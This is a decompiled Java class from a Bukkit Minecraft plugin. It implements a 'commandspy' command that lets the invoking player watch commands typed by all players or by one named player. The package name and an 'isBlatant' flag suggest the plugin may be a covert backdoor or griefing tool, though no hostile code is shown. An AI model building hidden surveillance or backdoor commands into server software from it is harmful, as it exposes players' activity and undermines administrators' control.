/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class CommandspyCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            if (plugin.commandSpyTargets.contains(p2.getName())) {
                plugin.commandSpyTargets.remove(p2.getName());
                p2.sendMessage(Settings.PREFIX("Command spy is now off!"));
            } else {
                plugin.commandSpyTargets.add(p2.getName());
                p2.sendMessage(Settings.PREFIX("Command spy is now on!"));
            }
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else if (plugin.commandSpyMap.containsKey(p2)) {
                plugin.commandSpyMap.remove(p2);
                p2.sendMessage(Settings.PREFIX("You are no longer spying on " + Settings.RED + target.getName() + "'s " + Settings.WHITE + "commands"));
            } else {
                plugin.commandSpyMap.put(p2, target);
                p2.sendMessage(Settings.PREFIX("You are now spying on " + Settings.RED + target.getName() + "'s " + Settings.WHITE + "commands"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

